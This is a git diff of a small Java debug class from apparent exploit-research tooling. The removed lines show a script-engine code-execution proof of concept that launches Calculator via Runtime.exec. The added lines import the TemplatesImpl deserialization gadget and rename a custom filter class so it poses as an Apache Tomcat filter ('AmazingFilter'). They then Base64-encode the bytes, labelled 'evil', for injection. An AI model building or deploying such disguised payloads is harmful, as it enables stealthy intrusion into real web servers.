@@ -1,9 +1,10 @@
 package com.sorry.bug;
 
+import com.sorry.utils.bytetricks.Proxy;
+import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 
-import javax.script.ScriptEngine;
-import javax.script.ScriptEngineManager;
-import java.lang.reflect.Method;
+import java.util.Base64;
+
 
 /**
  * created by 0x22cb7139 on 2021/7/14
@@ -11,15 +12,9 @@ import java.lang.reflect.Method;
 public class Debug {
     public static void main(String[] args) {
         try{
-            ScriptEngine scriptEngine = new ScriptEngineManager().getEngineByExtension("js");
-            scriptEngine.eval("java.lang.Runtime.getRuntime().exec('/System/Applications/Calculator.app/Contents/MacOS/Calculator');");
-
-            Class clazz = Class.forName("javax.script.ScriptEngineManager");
-            Object manager = clazz.getDeclaredConstructor().newInstance();
-            Method method = clazz.getDeclaredMethod("getEngineByExtension", new Class[]{String.class});
-            Object engine = method.invoke(manager,"js");
-            Method eval = engine.getClass().getMethod("eval",new Class[]{String.class});
-            eval.invoke(engine,"print('hello world2');");
+            byte[] evil = Proxy.ChangeClassName("com.sorry.bug.CustomFilter","org.apache.catalina.filters.AmazingFilter");
+            String evil64 =  Base64.getEncoder().encodeToString(evil);
+            System.out.println(evil64);
         }catch (Exception e){
             e.printStackTrace();
         }
